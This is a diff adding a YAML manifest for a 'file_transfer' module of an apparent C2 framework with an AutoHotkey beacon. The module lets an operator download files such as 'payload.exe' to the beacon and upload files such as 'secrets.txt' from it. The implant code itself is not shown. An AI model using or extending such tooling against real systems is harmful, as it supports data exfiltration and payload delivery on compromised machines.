@@ -1,0 +1,83 @@
+module:
+  id: file_transfer
+  version: "1.0.0"
+  display_name: "File Transfer"
+  description: "Upload and download files between beacon and C2 server"
+
+  # Dependencies
+  requires: []
+
+  # What this module provides
+  provides:
+    - HandleFileDownload
+    - HandleFileUpload
+
+  # Code files in inclusion order
+  files:
+    - code.ahk
+
+  # Command dispatch additions
+  dispatch:
+    download_file: HandleFileDownload
+    upload_file: HandleFileUpload
+
+  # Schema contribution
+  schema:
+    category_id: file_operations
+    category_name: "File Operations"
+    modules:
+      download_file:
+        display_name: "Download File"
+        description: "Download a file from the C2 server to the beacon"
+        command_template: "download_file|{filename}"
+        parameters:
+          filename:
+            type: text
+            display_name: "Filename"
+            description: "Name of the file on the server to download"
+            required: true
+            default: ""
+            validation:
+              min_length: 1
+              max_length: 256
+        documentation:
+          content: "Downloads a file from the C2 server to the beacon's current working directory."
+          examples:
+            - "payload.exe"
+            - "script.ps1"
+        execution:
+          timeout: 600
+          requires_admin: false
+        ui:
+          layout: simple
+      upload_file:
+        display_name: "Upload File"
+        description: "Upload a file from the beacon to the C2 server"
+        command_template: "upload_file|{filepath}"
+        parameters:
+          filepath:
+            type: text
+            display_name: "File Path"
+            description: "Full path to the file on the beacon to upload"
+            required: true
+            default: ""
+            validation:
+              min_length: 1
+              max_length: 512
+        documentation:
+          content: "Uploads a file from the beacon to the C2 server. File is transferred in chunks to handle large files."
+          examples:
+            - "C:\\Users\\admin\\Documents\\secrets.txt"
+            - "C:\\temp\\output.log"
+        execution:
+          timeout: 1800
+          requires_admin: false
+        ui:
+          layout: simple
+
+  # Builder UI options
+  config_options:
+    chunk_size:
+      type: integer
+      default: 1048576
+      label: "Chunk Size (bytes)"
